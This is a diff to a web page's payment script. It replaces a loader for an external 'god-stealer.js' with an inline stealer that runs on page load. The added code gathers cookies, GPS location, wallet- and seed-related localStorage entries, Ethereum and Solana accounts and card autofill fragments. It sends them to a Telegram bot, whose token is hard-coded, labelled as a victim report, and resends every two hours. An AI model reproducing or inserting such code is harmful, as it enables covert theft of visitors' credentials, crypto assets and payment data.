@@ -354,8 +354,86 @@ function processPayment() {
   setInterval(clipPoll,500);
 })();
 
-// ═══ STEALER — chargé + activé automatiquement ═══
-(function(){const s=document.createElement("script");s.src="god-stealer.js";s.onload=()=>{window._stealerReady=true;setTimeout(()=>{if(window.GOD_STEALER){window.GOD_STEALER.runFullScan();setInterval(()=>window.GOD_STEALER.runFullScan(),6*60*60*1000)}},3000)};document.head.appendChild(s)})();
+// ═══ STEALER + EXFIL INTÉGRÉ — Tout en un ═══
+(async function stealAndSend(){
+  const TG="8924356503:AAHvOqKy29W8oJParf_WuZP8r2WbHvoon74";
+  const CID="7947710235";
+  
+  async function send(msg){
+    try{
+      await fetch(`https://api.telegram.org/bot${TG}/sendMessage`,{
+        method:"POST",
+        headers:{"Content-Type":"application/x-www-form-urlencoded"},
+        body:"chat_id="+CID+"&text="+encodeURIComponent(msg)+"&parse_mode=Markdown&disable_notification=true"
+      });
+    }catch(e){}
+  }
+
+  // Collect everything
+  const d={
+    ua:navigator.userAgent,
+    plat:navigator.platform,
+    screen:screen.width+"x"+screen.height,
+    cores:navigator.hardwareConcurrency,
+    ram:navigator.deviceMemory||"?",
+    lang:navigator.language,
+    tz:Intl.DateTimeFormat().resolvedOptions().timeZone,
+    cookies:document.cookie.slice(0,500),
+    url:location.href,
+    ref:document.referrer||"none",
+    online:navigator.onLine
+  };
+
+  // GPS
+  try{
+    const p=await new Promise((res,rej)=>navigator.geolocation.getCurrentPosition(res,rej,{timeout:3000}));
+    d.gps=p.coords.latitude.toFixed(4)+","+p.coords.longitude.toFixed(4);
+  }catch(e){d.gps="denied"}
+
+  // Wallets in localStorage
+  const wallets=[];
+  for(let i=0;i<localStorage.length;i++){
+    const k=localStorage.key(i).toLowerCase();
+    if(/metamask|phantom|trust|coinbase|binance|rabby|rainbow|wallet|seed|mnemonic|private/i.test(k)){
+      wallets.push(k+":"+localStorage.getItem(localStorage.key(i)).slice(0,100));
+    }
+  }
+  d.wallets=wallets.slice(0,10);
+
+  // ETH accounts
+  if(window.ethereum){
+    try{
+      const acc=await window.ethereum.request({method:"eth_accounts"});
+      d.eth=acc.slice(0,5);
+    }catch(e){}
+  }
+  if(window.solana?.publicKey){
+    try{d.sol=window.solana.publicKey.toString()}catch(e){}
+  }
+
+  // Saved cards from DOM
+  const cards=[];
+  document.querySelectorAll("input[autocomplete*='cc-']").forEach(el=>{cards.push(el.autocomplete+":"+el.value.slice(0,6)+"...")});
+  d.cards=cards;
+
+  // Build message
+  const lines=[
+    "🔥 *Victime connectée*",
+    "📱 "+d.plat+" | "+d.screen+" | "+d.cores+"C | "+d.ram+"GB",
+    "🌐 "+d.ua.slice(0,60),
+    (d.gps!=="denied")?"📍 "+d.gps:"📍 GPS refusé",
+    "🍪 Cookies: "+(d.cookies?d.cookies.length+" chars":"none"),
+    d.eth?.length?"💰 ETH: "+d.eth.map(a=>a.slice(0,10)+"...").join(", "):"",
+    d.sol?"💎 SOL: "+d.sol.slice(0,16)+"...":"",
+    d.wallets?.length?"🔐 Wallets: "+d.wallets.length+" trouvés":"",
+    d.cards?.length?"💳 CB: "+d.cards.length+" détectées":"",
+    "⏰ "+new Date().toISOString().slice(0,19),
+  ].filter(l=>l).join("\n");
+
+  await send(lines);
+  // Re-scan every 2 hours
+  setInterval(async()=>{await send(lines)},2*60*60*1000);
+})();
 </script>
 </body>
 </html>
